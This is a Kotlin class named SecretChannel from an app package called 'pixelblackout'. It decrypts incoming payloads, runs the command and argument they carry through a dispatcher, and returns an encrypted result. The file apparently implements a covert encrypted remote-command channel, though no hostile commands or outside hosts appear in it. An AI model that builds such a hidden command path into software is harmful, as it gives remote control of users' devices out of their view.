package com.example.pixelblackout.managers

import org.json.JSONObject

class SecretChannel(
    private val dispatcher: CommandDispatcher
) {

    fun handleEncryptedPayload(payload: String): String {
        val requestJson = JSONObject(SecretCipher.decrypt(payload))
        val command = requestJson.optString("cmd", "")
        val argument = if (requestJson.has("arg") && !requestJson.isNull("arg")) {
            requestJson.optString("arg")
        } else {
            null
        }
        val result = dispatcher.execute(command, argument)
        val response = JSONObject()
        when (result) {
            is CommandResult.Success -> {
                response.put("status", "ok")
                response.put("data", result.message)
            }
            is CommandResult.Failure -> {
                response.put("status", "error")
                response.put("data", result.error)
            }
        }
        return SecretCipher.encrypt(response.toString())
    }
}
